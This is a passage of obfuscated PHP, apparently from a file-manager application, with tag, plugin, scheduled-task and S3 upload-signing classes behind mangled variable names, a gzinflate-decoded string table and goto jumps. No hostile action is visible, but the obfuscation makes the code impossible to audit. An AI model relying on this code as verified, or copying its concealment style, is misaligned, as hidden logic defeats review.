$ÁÃŞÎ¶¦ = Model($¡å†»²›[855])->where($úôÜì‚)->field($¡å†»²›[1964])->select(); $ÁÃŞÎ¶¦ = array_to_keyvalue($ÁÃŞÎ¶¦, $¡å†»²›[534], $¡å†»²›[440]); $ã†¬„²± = !empty($ÁÃŞÎ¶¦[$º»ÑÑ¨ƒ]) ? $ÁÃŞÎ¶¦[$º»ÑÑ¨ƒ] : !1; if ($ã†¬„²±) { if (!$ÁÃŞÎ¶¦[$µ²½“İù]) { $ÁÃŞÎ¶¦[$µ²½“İù] = Model($¡å†»²›[855])->groupRootAdd($µ²½“İù); } $å¤€¹Ø” = $ÁÃŞÎ¶¦[$µ²½“İù]; $úôÜì‚ = array($¡å†»²›[470] => $ã†¬„²±); $ÁÃŞÎ¶¦ = Model($¡å†»²›[855])->where($úôÜì‚)->field($¡å†»²›[1965])->select(); if (!$ÁÃŞÎ¶¦) { $ÁÃŞÎ¶¦ = array(); } Model($¡å†»²›[855])->moveClearAuth = !1; foreach ($ÁÃŞÎ¶¦ as $õ€£ı‡ü) { $®Æ…å = $õ€£ı‡ü[$¡å†»²›[448]] == $¡å†»²›[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¡å†»²›[855])->move($õ€£ı‡ü[$¡å†»²›[440]], $å¤€¹Ø”, $®Æ…å); } Model($¡å†»²›[855])->moveClearAuth = !0; $úôÜì‚ = array($¡å†»²›[449] => 2, $¡å†»²›[534] => $º»ÑÑ¨ƒ); $æëÚ» = array($¡å†»²›[534] => $µ²½“İù); Model($¡å†»²›[1966])->where($úôÜì‚)->save($æëÚ»); Model($¡å†»²›[1967])->where($úôÜì‚)->save($æëÚ»); } $this->_changeChildLevel($íí£Õªñ[$º»ÑÑ¨ƒ], $íí£Õªñ[$µ²½“İù], !0); $this->where(array($¡å†»²›[470] => $º»ÑÑ¨ƒ))->save(array($¡å†»²›[470] => $µ²½“İù)); $this->_clearChildrenCache($íí£Õªñ[$µ²½“İù]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($¬Ò÷ó„¾) { $şëÅçé =& $_SERVER[¹òÍ›æş]; return array($şëÅçé[1968] => array($¬Ò÷ó„¾[0], $şëÅçé[1969]), $şëÅçé[1970] => array($¬Ò÷ó„¾[0], $şëÅçé[1971])); } protected function get($Ãæ‚‚‹ß) { $ŠÇ®–ê¾ =& $_SERVER[¹òÍ›æş]; $—§·„¨° = Model($ŠÇ®–ê¾[550])->metaGet($Ãæ‚‚‹ß, $ŠÇ®–ê¾[1972]); $ñ‡©Ïü¢ = json_decode($—§·„¨°, !0); return $ñ‡©Ïü¢ ? $ñ‡©Ïü¢ : array($ŠÇ®–ê¾[1973] => $ŠÇ®–ê¾[98], $ŠÇ®–ê¾[407] => array()); } protected function set($úÇÕóÆÄ, $ß¶—òèš) { $‡½òæ¹ı =& $_SERVER[¹òÍ›æş]; $ß¶—òèš = $ß¶—òèš ? $ß¶—òèš : array($‡½òæ¹ı[1973] => $‡½òæ¹ı[98], $‡½òæ¹ı[407] => array()); return Model($‡½òæ¹ı[550])->metaSet($úÇÕóÆÄ, $‡½òæ¹ı[1972], json_encode($ß¶—òèš)); } protected function getByTagID($âé†£…, $¦šòÚş) { $Õ‘˜¶ı =& $_SERVER[¹òÍ›æş]; if (!$âé†£… || !$¦šòÚş) { return !1; } if (!Model($Õ‘˜¶ı[550])->getInfoSimple($âé†£…)) { return !1; } $úú¦ƒƒº = $this->get($âé†£…); if (!$úú¦ƒƒº || !isset($úú¦ƒƒº[$Õ‘˜¶ı[407]])) { return !1; } $é âŒ”Ø = array_find_by_field($úú¦ƒƒº[$Õ‘˜¶ı[407]], $Õ‘˜¶ı[437], $¦šòÚş); return is_array($é âŒ”Ø) ? $é âŒ”Ø : !1; } public function listSource($—üËµ©, $øç¶¶ÄË) { $®Ûã³¢‹ =& $_SERVER[¹òÍ›æş]; if ($øç¶¶ÄË && !is_array($øç¶¶ÄË)) { $øç¶¶ÄË = array($øç¶¶ÄË); } $­íçúËü = $this->listData($—üËµ©); $ş·¾§Šµ = array(); foreach ($­íçúËü as $„ııïüí) { $©…­¬²— = $„ııïüí[$®Ûã³¢‹[94]]; if (!$©…­¬²—) { continue; } if (!isset($ş·¾§Šµ[$©…­¬²—])) { $ş·¾§Šµ[$©…­¬²—] = array(); } $ş·¾§Šµ[$©…­¬²—][] = $„ııïüí[$®Ûã³¢‹[464]]; } $ùŠã¤âÑ = array(); foreach ($ş·¾§Šµ as $ì°©àÊÏ => $‘ïºúü…) { $íØõ˜ğõ = !0; if (!$øç¶¶ÄË) { $ùŠã¤âÑ[] = $ì°©àÊÏ; continue; } foreach ($øç¶¶ÄË as $–ùÊœØ÷) { if (!in_array($–ùÊœØ÷, $‘ïºúü…)) { $íØõ˜ğõ = !1; break; } } if ($íØõ˜ğõ) { $ùŠã¤âÑ[] = $ì°©àÊÏ; } } if (!$ùŠã¤âÑ) { return array(); } $åù¶”±‚ = array($®Ûã³¢‹[455] => array($®Ûã³¢‹[456], $ùŠã¤âÑ), $®Ûã³¢‹[534] => $—üËµ©, $®Ûã³¢‹[449] => SourceModel::TYPE_GROUP); $†ıØˆéø = Model($®Ûã³¢‹[1360])->listSource($åù¶”±‚); if (!$†ıØˆéø || count($ùŠã¤âÑ) == $†ıØˆéø[$®Ûã³¢‹[404]][$®Ûã³¢‹[405]]) { return $†ıØˆéø; } $Íù«†¿É = array(); $¿öˆ•¨ñ = array_to_keyvalue($†ıØˆéø[$®Ûã³¢‹[92]], $®Ûã³¢‹[12], $®Ûã³¢‹[440]); $ÉŠŞÍ”Ä = array_to_keyvalue($†ıØˆéø[$®Ûã³¢‹[93]], $®Ûã³¢‹[12], $®Ûã³¢‹[440]); $±Ÿ»´¬Ï = array_merge($ÉŠŞÍ”Ä, $¿öˆ•¨ñ); foreach ($ùŠã¤âÑ as $©…­¬²—) { if (!in_array($©…­¬²—, $±Ÿ»´¬Ï)) { $Íù«†¿É[] = $©…­¬²—; } } if ($Íù«†¿É) { $this->removeBySource($—üËµ©, $Íù«†¿É); } return $†ıØˆéø; } protected function listData($Åë£¦Ò) { $èô¿é”Œ =& $_SERVER[¹òÍ›æş]; $ò®˜ëçà = array($èô¿é”Œ[1660] => 0, $èô¿é”Œ[521] => array($èô¿é”Œ[1974], 0), $èô¿é”Œ[460] => $èô¿é”Œ[1975] . $Åë£¦Ò); $äÆ—Ô­¹ = $èô¿é”Œ[1976]; $ì¯·Ïç± = $this->field($äÆ—Ô­¹)->where($ò®˜ëçà)->order($èô¿é”Œ[1977])->select(); return $ì¯·Ïç± ? $ì¯·Ïç± : array(); } protected function addToTag($ÃÏÅÌ©, $†¸’¼Ê’, $á÷ª×Û¹) { $äêææñŞ =& $_SERVER[¹òÍ›æş]; if (!$this->getByTagID($ÃÏÅÌ©, $á÷ª×Û¹) || !$†¸’¼Ê’) { return !1; } if (!Model($äêææñŞ[855])->pathInfo($†¸’¼Ê’)) { return !1; } $æ«ÊÚî = array($äêææñŞ[1660] => 0, $äêææñŞ[521] => $á÷ª×Û¹, $äêææñŞ[459] => $†¸’¼Ê’, $äêææñŞ[460] => $äêææñŞ[1978] . $ÃÏÅÌ©, $äêææñŞ[458] => $äêææñŞ[12], $äêææñŞ[1863] => 0); if ($this->where($æ«ÊÚî)->find()) { return !1; } return $this->add($æ«ÊÚî); } protected function removeFromTag($Õ¼ø£úÛ, $œêÆ¯¿Š, $è¸Ü¼) { $áÔé¼ÜÕ =& $_SERVER[¹òÍ›æş]; if (!$this->getByTagID($Õ¼ø£úÛ, $è¸Ü¼) || !$œêÆ¯¿Š) { return !1; } if (is_array($œêÆ¯¿Š)) { $œêÆ¯¿Š = array($áÔé¼ÜÕ[7], $œêÆ¯¿Š); } $Ãµî·«¾ = array($áÔé¼ÜÕ[1660] => 0, $áÔé¼ÜÕ[521] => $è¸Ü¼, $áÔé¼ÜÕ[460] => $áÔé¼ÜÕ[1978] . $Õ¼ø£úÛ, $áÔé¼ÜÕ[459] => $œêÆ¯¿Š); return $this->where($Ãµî·«¾)->delete(); } protected function removeByTag($ËşÈ¢°ß, $‘„şşª”) { $ÍÏ¤Õà¶ =& $_SERVER[¹òÍ›æş]; if (!$this->getByTagID($ËşÈ¢°ß, $‘„şşª”)) { return !1; } $ƒ¢¢®š = array($ÍÏ¤Õà¶[1660] => 0, $ÍÏ¤Õà¶[521] => $‘„şşª”, $ÍÏ¤Õà¶[460] => $ÍÏ¤Õà¶[1978] . $ËşÈ¢°ß); return $this->where($ƒ¢¢®š)->delete(); } protected function removeBySource($ó²ß¾ùß, $Äî”å¤À) { $ÎÔ›Ä¡ =& $_SERVER[¹òÍ›æş]; if (!$ó²ß¾ùß || !$Äî”å¤À) { return !1; } if (is_array($Äî”å¤À)) { $Äî”å¤À = array($ÎÔ›Ä¡[7], $Äî”å¤À); } $İëñ‰„ = array($ÎÔ›Ä¡[1660] => 0, $ÎÔ›Ä¡[459] => $Äî”å¤À, $ÎÔ›Ä¡[521] => array($ÎÔ›Ä¡[1041], 0), $ÎÔ›Ä¡[460] => $ÎÔ›Ä¡[1978] . $ó²ß¾ùß); return $this->where($İëñ‰„)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\x70\154\x75\x67\x69\x6e\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\164\x61\x74\165\x73", "\x72\145\147\151\145\x73\164", "\x63\x6f\156\146\x69\147"); public function loadList($Å¡ßÚŠ• = false) { $ ©˜ø³” = array_to_keyvalue($this->listData(), $_SERVER[¹òÍ›æş][32]); if ($Å¡ßÚŠ•) { return $ ©˜ø³”[$Å¡ßÚŠ•]; } return $ ©˜ø³”; } public function init() { $áŠÖºˆ‰ =& $_SERVER[¹òÍ›æş]; Hook::trigger($áŠÖºˆ‰[1979]); $Ì¦ÀÀå¥ = $this->loadPluginList(); foreach ($Ì¦ÀÀå¥ as $öÏêÈåÀ => $£å‰¡ƒ¿) { $…ñõÀŠ = $this->appAllow($öÏêÈåÀ, $£å‰¡ƒ¿); if (!$…ñõÀŠ) { continue; } foreach ($£å‰¡ƒ¿[$áŠÖºˆ‰[1980]] as $â¨œí— => $Ò§èª¬Ã) { Hook::bind($â¨œí—, $Ò§èª¬Ã); } } Hook::trigger($áŠÖºˆ‰[1981]); Hook::trigger(ACTION); } public function appAllow($¨á‹ºÒê, $±×½, $ï±¦ŒÁ¥ = true) { $Ì¡¥øä° =& $_SERVER[¹òÍ›æş]; $¶å†±Äß = PLUGIN_DIR . $¨á‹ºÒê . $Ì¡¥øä°[1982]; if (!is_array($±×½) || !is_array($±×½[$Ì¡¥øä°[1980]]) || $±×½[$Ì¡¥øä°[780]] != 1 || !is_file($¶å†±Äß)) { return !1; } if ($GLOBALS[$Ì¡¥øä°[532]] == 1) { if ($GLOBALS[$Ì¡¥øä°[6]][$Ì¡¥øä°[1983]] || !$GLOBALS[$Ì¡¥øä°[6]][$Ì¡¥øä°[1984]]) { return !0; } $Øá™Ó®´ = explode($Ì¡¥øä°[50], strtolower($GLOBALS[$Ì¡¥øä°[6]][$Ì¡¥øä°[1984]])); return in_array(strtolower($¨á‹ºÒê), $Øá™Ó®´) ? !1 : !0; } if ($ï±¦ŒÁ¥ && !Action($Ì¡¥øä°[1985])->checkAuth($¨á‹ºÒê)) { return !1; } return !0; } public function unInstall($ò­–À½¶) { $Û‚¿¹Åä =& $_SERVER[¹òÍ›æş]; $¹‰İÏ¢• = $this->loadList($ò­–À½¶); if (file_exists(PLUGIN_DIR . $ò­–À½¶)) { Hook::apply($ò­–À½¶ . $Û‚¿¹Åä[1986]); } $this->remove($¹‰İÏ¢•[$Û‚¿¹Åä[437]]); } public function changeStatus($Ö³Ã¥§ï, $ã¡Àüˆ®) { $…ûìÔš¯ =& $_SERVER[¹òÍ›æş]; $„š…åê = $this->loadList($Ö³Ã¥§ï); if ($ã¡Àüˆ®) { Hook::apply($Ö³Ã¥§ï . $…ûìÔš¯[1987]); } $this->update($„š…åê[$…ûìÔš¯[437]], array($…ûìÔš¯[1988] => $ã¡Àüˆ®)); } public function appRegist($Úõ†Å¢, $Ëàî™×ê) { $Œˆ¾Û½Ë =& $_SERVER[¹òÍ›æş]; $‹Şê´É£ = $this->loadList($Úõ†Å¢); if ($‹Şê´É£) { $this->update($‹Şê´É£[$Œˆ¾Û½Ë[437]], array($Œˆ¾Û½Ë[1980] => $Ëàî™×ê)); } else { $œ´ùÒÏ  = array($Œˆ¾Û½Ë[32] => $Úõ†Å¢, $Œˆ¾Û½Ë[1980] => $Ëàî™×ê, $Œˆ¾Û½Ë[780] => 0, $Œˆ¾Û½Ë[6] => $this->getConfigDefault($Úõ†Å¢)); $this->insert($œ´ùÒÏ ); } } public function getConfigDefault($ËÓ¶Ù€) { $èƒ«ûâ¿ =& $_SERVER[¹òÍ›æş]; $ì¼—’“Ë = array(); $½ŞúÁıã = $this->getPackageJson($ËÓ¶Ù€); if (!$½ŞúÁıã && is_array($½ŞúÁıã[$èƒ«ûâ¿[1989]])) { return $ì¼—’“Ë; } foreach ($½ŞúÁıã[$èƒ«ûâ¿[1989]] as $ÜÕí–ÃÜ => $œæØÄúå) { if (!isset($œæØÄúå[$èƒ«ûâ¿[412]]) || isset($ì¼—’“Ë[$ÜÕí–ÃÜ])) { continue; } $ì¼—’“Ë[$ÜÕí–ÃÜ] = $œæØÄúå[$èƒ«ûâ¿[412]]; } return $ì¼—’“Ë; } public function getPackageJson($ÙŒÍ…·) { return Hook::apply($ÙŒÍ…· . $_SERVER[¹òÍ›æş][1990]); } public function getConfig($ëÕÆŠÄ¬, $ú˜˜ŒÜÃ = false) { $¶İ šù‡ =& $_SERVER[¹òÍ›æş]; $’àÔŞåŞ = array(); $ÍõğÛŒ§ = $this->loadList($ëÕÆŠÄ¬); if ($ÍõğÛŒ§ && is_array($ÍõğÛŒ§[$¶İ šù‡[6]])) { $’àÔŞåŞ = $ÍõğÛŒ§[$¶İ šù‡[6]]; } if (!$’àÔŞåŞ || $ú˜˜ŒÜÃ) { $’àÔŞåŞ = $this->getConfigDefault($ëÕÆŠÄ¬); } return $’àÔŞåŞ; } public function setConfig($§Âó”¬, $¤Ú÷ë¢ = false) { $ÃÉ«ÂÒº =& $_SERVER[¹òÍ›æş]; $²÷ñ©èš = $this->loadList($§Âó”¬); if (!$²÷ñ©èš) { return !1; } $€¨ûªâ± = $²÷ñ©èš[$ÃÉ«ÂÒº[6]]; if ($¤Ú÷ë¢ == !1) { $€¨ûªâ± = array(); $¤Ú÷ë¢ = $this->getConfigDefault($§Âó”¬); } foreach ($¤Ú÷ë¢ as $¸şÈ¤şå => $†¶ŸÍ…©) { $€¨ûªâ±[$¸şÈ¤şå] = is_string($†¶ŸÍ…©) ? trim($†¶ŸÍ…©) : $†¶ŸÍ…©; } $this->update($²÷ñ©èš[$ÃÉ«ÂÒº[437]], array($ÃÉ«ÂÒº[6] => $€¨ûªâ±)); } public function viewList() { $Áè½É =& $_SERVER[¹òÍ›æş]; $ÙôĞøı = $this->loadList(); $this->pluginScan($ÙôĞøı); $ÙôĞøı = $this->loadPluginList(); $ºÎ¬†·Û = array(); foreach ($ÙôĞøı as $¦¡Õ¡Í => $ñÈ²) { unset($ñÈ²[$Áè½É[1980]], $ñÈ²[$Áè½É[6]]); $ÔŠ•ºß“ = PLUGIN_DIR . $ñÈ²[$Áè½É[32]] . $Áè½É[1982]; if (!is_file($ÔŠ•ºß“)) { continue; } $ìƒ‘²ßğ = Hook::apply($ñÈ²[$Áè½É[32]] . $Áè½É[1990]); if (is_array($ìƒ‘²ßğ)) { $ºÎ¬†·Û[$¦¡Õ¡Í] = array_merge($ñÈ², $ìƒ‘²ßğ); } } return $ºÎ¬†·Û; } private function loadPluginList() { $›š£ºş =& $_SERVER[¹òÍ›æş]; $Äáí•·î = $this->loadList(); if (strtolower(MOD) == $›š£ºş[1991]) { return $Äáí•·î; } $¿Ô¢§«± = Hook::trigger($›š£ºş[1992], $Äáí•·î); if ($Äáí•·î && !$¿Ô¢§«±) { die; } return $¿Ô¢§«± ? $¿Ô¢§«± : $Äáí•·î; } private function pluginScan($İœ©ÍÒ”) { $ªŒ¼Â’ğ =& $_SERVER[¹òÍ›æş]; recursion_dir(PLUGIN_DIR, $Â–³Ú˜ª, $ÆÌ±ß×Î, 0); foreach ($Â–³Ú˜ª as $—˜³µ”Ã) { $í¶İà  = get_path_this($—˜³µ”Ã); if (isset($İœ©ÍÒ”[$í¶İà ]) || !file_exists($—˜³µ”Ã . $ªŒ¼Â’ğ[1993]) || !file_exists($—˜³µ”Ã . $ªŒ¼Â’ğ[1982])) { continue; } Hook::apply($í¶İà  . $ªŒ¼Â’ğ[1987]); } } } goto fï•¼ãõ¾¤; e’Ê¯–™íÔ: if (!$qejvsxporm) { die; } $_SERVER[¯ı†ò™•] = explode($_SERVER[¹òÍ›æş][645], gzinflate(substr($_SERVER[¹òÍ›æş][646], 10, -8))); $zlpdyovxqt = $_SERVER[¹òÍ›æş][647]; goto BÍİ›‰ËŒ™; A‘‡ÂïñÇŠ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $»Ó™‹÷Á =& $_SERVER[¹òÍ›æş]; if (self::valueGet($»Ó™‹÷Á[780]) != $»Ó™‹÷Á[98]) { return; } if (self::valueGet($»Ó™‹÷Á[1628]) == $»Ó™‹÷Á[98]) { $€ÏÀ¿ø = self::valueGet($»Ó™‹÷Á[1629]); if (time() - $€ÏÀ¿ø > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$»Ó™‹÷Á[1630]] = 1; self::valueSet($»Ó™‹÷Á[1628], $»Ó™‹÷Á[98]); self::log($»Ó™‹÷Á[1631] . ACTION . $»Ó™‹÷Á[1632]); Session::$data = array(); Session::$sessionSign = $»Ó™‹÷Á[12]; $GLOBALS[$»Ó™‹÷Á[532]] = 1; Hook::bind($»Ó™‹÷Á[1633], $»Ó™‹÷Á[1634]); $“¦ÑßÆå = 0; while (!0) { self::cacheClear(); if (self::valueGet($»Ó™‹÷Á[780]) != $»Ó™‹÷Á[98]) { self::valueSet($»Ó™‹÷Á[1628], $»Ó™‹÷Á[208]); self::log($»Ó™‹÷Á[1635]); die; } $…ş×²ŞŠ = time(); if ($…ş×²ŞŠ - $“¦ÑßÆå >= 60) { self::valueSet(array($»Ó™‹÷Á[1628] => $»Ó™‹÷Á[98], $»Ó™‹÷Á[1629] => $…ş×²ŞŠ), !1); $“¦ÑßÆå = $…ş×²ŞŠ; } if (!file_exists(USER_SYSTEM . $»Ó™‹÷Á[1636])) { self::valueSet(array($»Ó™‹÷Á[1628] => $»Ó™‹÷Á[208], $»Ó™‹÷Á[780] => $»Ó™‹÷Á[208]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $†ˆİŠˆ =& $_SERVER[¹òÍ›æş]; http_close(); self::valueSet($†ˆİŠˆ[780], $†ˆİŠˆ[208]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($†ˆİŠˆ[1628] => $†ˆİŠˆ[208], $†ˆİŠˆ[780] => $†ˆİŠˆ[98]), !1); } public static function taskSwitch() { $­îõëšä =& $_SERVER[¹òÍ›æş]; $Ÿ¹øØıÛ = self::valueGet($­îõëšä[780]) == $­îõëšä[98] ? $­îõëšä[208] : $­îõëšä[98]; self::valueSet($­îõëšä[780], $Ÿ¹øØıÛ); } public static function shutdownEvent() { $ İ—¡ˆ² =& $_SERVER[¹òÍ›æş]; self::valueSet($ İ—¡ˆ²[1628], $ İ—¡ˆ²[208]); self::log($ İ—¡ˆ²[1637]); } public static function config($°¨úÆ‘Ø, $½ß¢ÑÚğ) { self::valueSet($_SERVER[¹òÍ›æş][780], $°¨úÆ‘Ø); } private static function taskRunAll() { $™ÊÂ¤šÄ =& $_SERVER[¹òÍ›æş]; $ŸëÒ×³ = timeFloat(); $ƒúº©¾ = Model($™ÊÂ¤šÄ[1638])->listData(); $»Á”†šõ = count($ƒúº©¾); for ($­êİŒÄÄ = 0; $­êİŒÄÄ < $»Á”†šõ; $­êİŒÄÄ++) { $ÊéÈû…ç = $ƒúº©¾[$­êİŒÄÄ]; if (!$ÊéÈû…ç[$™ÊÂ¤šÄ[437]] || $ÊéÈû…ç[$™ÊÂ¤šÄ[1639]] != $™ÊÂ¤šÄ[98]) { continue; } if (!self::taskTimeCheck($ÊéÈû…ç)) { continue; } self::taskRun($ÊéÈû…ç); } Hook::trigger($™ÊÂ¤šÄ[1640]); self::taskQueueRun($ŸëÒ×³); } private static function taskQueueRun($íŒ”¡) { $ÒğıÛ“Ø = 10; while (!0) { $¹âıÉÑ = TaskQueue::run(); if ($¹âıÉÑ === !1) { break; } if (timeFloat() - $íŒ”¡ >= $ÒğıÛ“Ø) { break; } } } private static function taskTimeCheck($í®¢˜—İ) { $í€×ç˜ô =& $_SERVER[¹òÍ›æş]; $¬•„È±Š = json_decode($í®¢˜—İ[$í€×ç˜ô[190]], !0); $’Ó‘¸‚ = intval($í®¢˜—İ[$í€×ç˜ô[1629]]); $×ÄÒÉ¨ = strtotime($í€×ç˜ô[1641] . $¬•„È±Š[$í€×ç˜ô[1642]] . $í€×ç˜ô[1643]) - strtotime($í€×ç˜ô[1644]); $éÏ–ìôĞ = time() - strtotime(date($í€×ç˜ô[1645]) . $í€×ç˜ô[1646]); $¨á–èŒ = $éÏ–ìôĞ >= $×ÄÒÉ¨ && $éÏ–ìôĞ <= $×ÄÒÉ¨ + 3600; switch ($¬•„È±Š[$í€×ç˜ô[33]]) { case $í€×ç˜ô[1647]: if (time() - $’Ó‘¸‚ < 3600 * 24 * 30) { return !1; } if ($¬•„È±Š[$í€×ç˜ô[1647]] == date($í€×ç˜ô[1648]) && $¨á–èŒ) { return !0; } break; case $í€×ç˜ô[1649]: if (time() - $’Ó‘¸‚ < 3600 * 24 * 7) { return !1; } $¸÷ºÃ‚‡ = date($í€×ç˜ô[1650]) == 0 ? 7 : date($í€×ç˜ô[1650]); if ($¬•„È±Š[$í€×ç˜ô[1649]] == $¸÷ºÃ‚‡ && $¨á–èŒ) { return !0; } break; case $í€×ç˜ô[1642]: if (time() - $’Ó‘¸‚ < 3600 * 24) { return !1; } if ($¨á–èŒ) { return !0; } break; case $í€×ç˜ô[1651]: if (time() - $’Ó‘¸‚ >= floatval($¬•„È±Š[$í€×ç˜ô[1651]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $å£ŠØ’ =& $_SERVER[¹òÍ›æş]; static $ü‰“€ş = 0; $¦ïÒŸÎÔ = 300; if (!$ü‰“€ş) { $ü‰“€ş = time(); } if (time() - $ü‰“€ş < $¦ïÒŸÎÔ) { return; } $ü‰“€ş = time(); $›Ü´çšó = Model($å£ŠØ’[542])->db($å£ŠØ’[12]); if ($›Ü´çšó) { $›Ü´çšó->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($å£ŠØ’[1652], $å£ŠØ’[1653]); die; } } public static function taskRun($˜ú¾Çûõ) { $–€›Îæá =& $_SERVER[¹òÍ›æş]; self::log($–€›Îæá[1654] . $˜ú¾Çûõ[$–€›Îæá[437]] . $–€›Îæá[1655] . $˜ú¾Çûõ[$–€›Îæá[32]] . $–€›Îæá[1656] . $˜ú¾Çûõ[$–€›Îæá[1657]]); Model($–€›Îæá[1638])->run($˜ú¾Çûõ[$–€›Îæá[437]]); $Ê•°ëåå = timeFloat(); $éà„ÃŞú = $–€›Îæá[12]; switch ($˜ú¾Çûõ[$–€›Îæá[33]]) { case $–€›Îæá[345]: $¨İ‰˜†£ = url_request($˜ú¾Çûõ[$–€›Îæá[1657]], $–€›Îæá[240], !1, !1, !1, !1, 10); if ($¨İ‰˜†£[$–€›Îæá[780]]) { $éà„ÃŞú = strlen($¨İ‰˜†£[$–€›Îæá[1229]]); } break; case $–€›Îæá[239]: $éà„ÃŞú = Hook::apply($˜ú¾Çûõ[$–€›Îæá[1657]]); default: break; } Model($–€›Îæá[1658])->add(array($–€›Îæá[1659] => $–€›Îæá[12], $–€›Îæá[1660] => $–€›Îæá[208], $–€›Îæá[33] => $–€›Îæá[1661] . $˜ú¾Çûõ[$–€›Îæá[437]], $–€›Îæá[1662] => json_encode(array($–€›Îæá[32] => $˜ú¾Çûõ[$–€›Îæá[32]], $–€›Îæá[1663] => timeFloat() - $Ê•°ëåå, $–€›Îæá[331] => $éà„ÃŞú)))); $³È“ï¡Ü = $éà„ÃŞú ? $–€›Îæá[1664] . $éà„ÃŞú : $–€›Îæá[12]; self::log($–€›Îæá[1665] . $˜ú¾Çûõ[$–€›Îæá[437]] . $–€›Îæá[174] . $³È“ï¡Ü); return !0; } private static function valueGet($™Š×Ÿ­›) { $ÌÃÑÓ‚× =& $_SERVER[¹òÍ›æş]; $âÒÚÏ´– = $ÌÃÑÓ‚×[1666]; $ô†ĞĞòÜ = Model($ÌÃÑÓ‚×[473])->get($™Š×Ÿ­›, $âÒÚÏ´–); if (is_null($ô†ĞĞòÜ)) { Model($ÌÃÑÓ‚×[473])->set($ÌÃÑÓ‚×[780], $ÌÃÑÓ‚×[98], $âÒÚÏ´–); Model($ÌÃÑÓ‚×[473])->set($ÌÃÑÓ‚×[1628], $ÌÃÑÓ‚×[208], $âÒÚÏ´–); $ô†ĞĞòÜ = Model($ÌÃÑÓ‚×[473])->get($™Š×Ÿ­›, $âÒÚÏ´–); } return $ô†ĞĞòÜ; } private static function valueSet($Í·óì¯ş, $ò¹“•ìÇ) { $Üœ­Şøä =& $_SERVER[¹òÍ›æş]; $Ñ“•´™ = $Üœ­Şøä[1667]; CacheLock::lock($Ñ“•´™); $¼”¦­ä = Model($Üœ­Şøä[473])->set($Í·óì¯ş, $ò¹“•ìÇ, $Üœ­Şøä[1666]); CacheLock::unlock($Ñ“•´™); return $¼”¦­ä; } protected static function log($¦ù Ø†¥) { write_log($¦ù Ø†¥, $_SERVER[¹òÍ›æş][1653]); } private static function cacheClear() { $Êğ†±¾¾ =& $_SERVER[¹òÍ›æş]; Cache::clearMemory(Model($Êğ†±¾¾[473])->cacheKey($Êğ†±¾¾[1666])); Cache::clearMemory(Model($Êğ†±¾¾[473])->cacheKey($Êğ†±¾¾[1668])); Model($Êğ†±¾¾[1638])->cacheClear(); self::closeDatabase(); } } $_file = $_SERVER[$_SERVER[¹òÍ›æş][63]]; $_size = $_SERVER[¹òÍ›æş][1534]; goto D±öà‹ñÂ; a«¬¦ôñßö: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¶³É‹›Š) { parent::__construct($¶³É‹›Š); } public function uploadFormData($æ€šşÜ¼, $…ùè…’ = 3600) { $Û³‘˜ˆ =& $_SERVER[¹òÍ›æş]; $¥ğº¥¨ = $Û³‘˜ˆ[209]; $á¸­Ÿ“Ñ = $Û³‘˜ˆ[247]; $‰İÅÛã¨ = $Û³‘˜ˆ[72]; $”úÈ£Ò = gmdate($Û³‘˜ˆ[248]); $ÎÒ†À½ = gmdate($Û³‘˜ˆ[249]); $Ç™±œ = $Û³‘˜ˆ[250]; $Ê«Ê¢Ä³ = $…ùè…’ . $Û³‘˜ˆ[12]; $ÔÑ¤š‡Ğ = $Û³‘˜ˆ[251]; $Ëİ‡Û– = array($this->accessKey, $ÎÒ†À½, $this->region, $‰İÅÛã¨, $Ç™±œ); $ş—¥¡­± = implode($Û³‘˜ˆ[8], $Ëİ‡Û–); $¹ŠÙ—Âó = array($Û³‘˜ˆ[252] => gmdate($Û³‘˜ˆ[1352], strtotime($Û³‘˜ˆ[254])), $Û³‘˜ˆ[255] => array(array($Û³‘˜ˆ[256] => $this->bucket), array($Û³‘˜ˆ[257] => $¥ğº¥¨), array($Û³‘˜ˆ[258], $Û³‘˜ˆ[259], $Û³‘˜ˆ[12]), array($Û³‘˜ˆ[258], $Û³‘˜ˆ[260], $Û³‘˜ˆ[12]), array($Û³‘˜ˆ[258], $Û³‘˜ˆ[261], $Û³‘˜ˆ[12]), array($Û³‘˜ˆ[262] => $ÔÑ¤š‡Ğ), array($Û³‘˜ˆ[263] => $ş—¥¡­±), array($Û³‘˜ˆ[264] => $á¸­Ÿ“Ñ), array($Û³‘˜ˆ[265] => $”úÈ£Ò), array($Û³‘˜ˆ[266] => $Ê«Ê¢Ä³))); $ºéÒØ½ª = base64_encode(json_encode($¹ŠÙ—Âó)); $øù°›ó = hash_hmac($Û³‘˜ˆ[267], $ÎÒ†À½, $Û³‘˜ˆ[268] . $this->secret, !0); $üãÊ¹Øñ = hash_hmac($Û³‘˜ˆ[267], $this->region, $øù°›ó, !0); $úÎø‘õ  = hash_hmac($Û³‘˜ˆ[267], $‰İÅÛã¨, $üãÊ¹Øñ, !0); $á¾Ó¸¨¶ = hash_hmac($Û³‘˜ˆ[267], $Ç™±œ, $úÎø‘õ , !0); $ÅúõÏ€’ = hash_hmac($Û³‘˜ˆ[267], $ºéÒØ½ª, $á¾Ó¸¨¶); $¯¡„Ò™Ø = array($Û³‘˜ˆ[225] => $Û³‘˜ˆ[12], $Û³‘˜ˆ[269] => $Û³‘˜ˆ[12], $Û³‘˜ˆ[257] => $¥ğº¥¨, $Û³‘˜ˆ[262] => $ÔÑ¤š‡Ğ, $Û³‘˜ˆ[270] => $ºéÒØ½ª, $Û³‘˜ˆ[271] => $ş—¥¡­±, $Û³‘˜ˆ[272] => $á¸­Ÿ“Ñ, $Û³‘˜ˆ[273] => $”úÈ£Ò, $Û³‘˜ˆ[274] => $Ê«Ê¢Ä³, $Û³‘˜ˆ[275] => $ÅúõÏ€’, $Û³‘˜ˆ[192] => $this->getHost()); return 